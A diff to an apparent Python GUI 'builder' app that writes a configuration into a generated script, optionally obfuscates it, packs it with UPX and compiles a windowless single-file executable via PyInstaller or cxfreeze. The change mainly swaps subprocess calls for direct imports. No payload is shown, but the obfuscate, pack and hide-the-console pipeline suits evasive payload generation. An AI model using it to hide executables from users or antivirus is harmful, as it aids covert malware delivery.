@@ -15,6 +15,9 @@ import pyuac
 import requests
 from PIL import Image
 
+from tools import obfuscation, upx
+from PyInstaller.__main__ import run as pyinstaller_run
+
 logging.basicConfig(
     level=logging.DEBUG,
     filename='luna.log',
@@ -465,9 +468,8 @@ class App(customtkinter.CTk):
                 exeicon = self.iconpath
 
             if filetype == "pyinstaller":
-                subprocess.run(["./env/Scripts/python.exe", "./tools/upx.py"])
-                subprocess.run(["./env/Scripts/python.exe", "-m", "PyInstaller",
-                                "--onefile", "--clean", "--noconsole",
+                upx.UPX()
+                pyinstaller_run(["--onefile", "--clean", "--noconsole",
                                 "--upx-dir=./tools", "--distpath=./",
                                 "--hidden-import", "base64",
                                 "--hidden-import", "ctypes",
@@ -490,7 +492,7 @@ class App(customtkinter.CTk):
 
             elif filetype == "cxfreeze":
                 cmd_args = [
-                    "cxfreeze",
+                    "./env/Scripts/cxfreeze.exe",
                     f"{filename}.py",
                     "--target-name", filename,
                     "--base-name", "Win32GUI",
@@ -547,18 +549,12 @@ class App(customtkinter.CTk):
                 f.write(self.get_config())
 
             if self.obfuscation.get() == 1:
-                print("1")
-                subprocess.run(f"./env/Scripts/python.exe ./tools/obfuscation.py ./{filename}.py")
-                print("2")
+                obfuscation.obfuscate_script(f"./{filename}.py")
                 os.remove(f"./{filename}.py")
-                print("3")
                 os.rename(f"./Obfuscated_{filename}.py", f"./{filename}.py")
-                print("4")
                 logging.info(f"Successfully obfuscated file: {filename}.py")
-                print("5")
         except Exception as e:
             logging.error(f"Error with writing and obfuscating file: {e}")
-            print("6")
 
     def buildfile(self):
         try:
